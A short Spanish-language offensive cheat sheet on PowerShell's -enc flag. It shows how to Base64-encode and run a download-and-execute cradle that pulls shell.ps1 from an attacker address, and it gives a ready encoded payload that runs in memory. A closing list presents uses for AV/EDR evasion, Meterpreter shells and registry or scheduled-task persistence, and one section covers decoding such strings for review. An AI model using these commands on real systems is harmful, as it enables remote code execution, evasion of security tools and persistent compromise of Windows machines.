El flag `-enc` (abreviatura de `-encodedCommand`) en PowerShell permite ejecutar comandos codificados en Base64. Es común en técnicas de evasión, persistencia y ejecución remota de payloads en entornos Windows comprometidos.

---

## 1. Ejemplo básico de uso

```cmd
powershell -enc <cadena_base64>
```

Donde `<cadena_base64>` es el comando PowerShell codificado en Base64 en UTF-16LE (Unicode Little Endian).

---

## 2. Codificar un comando

### En Linux:
```bash
echo -n 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://tu_ip/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0
```

### En Windows (PowerShell):
```powershell
$command = 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://tu_ip/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
[Convert]::ToBase64String($bytes)
```

---

## 3. Ejecutar payloads codificados

```cmd
powershell -enc SQBtAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMgAuADAALgAwAC4AMQAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQA=
```

Esto ejecutará el comando en memoria sin escribir nada en disco.

---

## 4. Decodificar manualmente

Para revisar qué hace un comando `-enc`, decodifica así:

### En Linux:
```bash
echo '<cadena_base64>' | base64 -d | iconv -f UTF-16LE
```

### En PowerShell:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<cadena_base64>"))
```

---

## Uso OSCP-style
- Evasión AV/EDR cuando se bloquea PowerShell interactivo
- Payloads de Meterpreter o shells personalizadas en memoria
- Persistencia en claves de registro o tareas programadas

---
